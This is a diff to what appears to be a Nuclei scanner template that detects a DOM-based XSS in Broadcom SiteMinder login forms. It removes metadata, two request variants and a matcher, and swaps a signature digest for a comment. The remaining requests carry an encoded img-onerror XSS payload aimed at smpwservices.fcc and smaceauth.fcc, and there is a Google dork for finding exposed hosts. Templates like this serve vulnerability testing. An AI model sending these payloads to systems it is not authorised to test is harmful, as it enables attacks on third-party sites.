@@ -12,32 +12,24 @@ info:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
     cvss-score: 7.2
     cwe-id: CWE-79
-    cpe: cpe:2.3:a:broadcom:siteminder:*:*:*:*:*:*:*:*
   metadata:
     verified: true
-    max-request: 2
     google-query: inurl:"smpwservices.fcc"
-    product: siteminder
-    vendor: broadcom
-  tags: dom,xss,siteminder,vuln
+  tags: dom,xss,siteminder
 
 http:
   - method: GET
     path:
       - '{{BaseURL}}/siteminderagent/forms/smpwservices.fcc?USERNAME=\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e&SMAUTHREASON=7'
       - '{{BaseURL}}/siteminderagent/forms/smaceauth.fcc?USERNAME=\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e&SMAUTHREASON=7'
-      - '{{BaseURL}}/siteminderagent/forms/smpwservices.fcc?USERNAME=\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm\u0028document.domain\u0029\u0022\u003e&SMAUTHREASON=7'
-      - '{{BaseURL}}/siteminderagent/forms/smaceauth.fcc?USERNAME=\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm\u0028document.domain\u0029\u0022\u003e&SMAUTHREASON=7'
 
     stop-at-first-match: true
-
     matchers-condition: and
     matchers:
+
       - type: word
         words:
           - '\u003d\u0022confirm(document.domain)\u0022\u003e</B> you cannot access your'
-          - '\u003d\u0022confirm\u0028document.domain\u0029\u0022\u003e</B> you cannot access your'
-        condition: or
 
       - type: word
         part: header
@@ -47,4 +39,5 @@ http:
       - type: status
         status:
           - 200
-# digest: 4b0a00483046022100f872dc30333b1b9198c54a26b2971573d0b861ddaa6d9b9c7428152ad9996434022100b1eb39556257d5973cff49830f001c104748cc1a0fd093887ed86e83114cc912:922c64590222798bb761d5b6d8e72950
+
+# Enhanced by mp on 2022/09/23
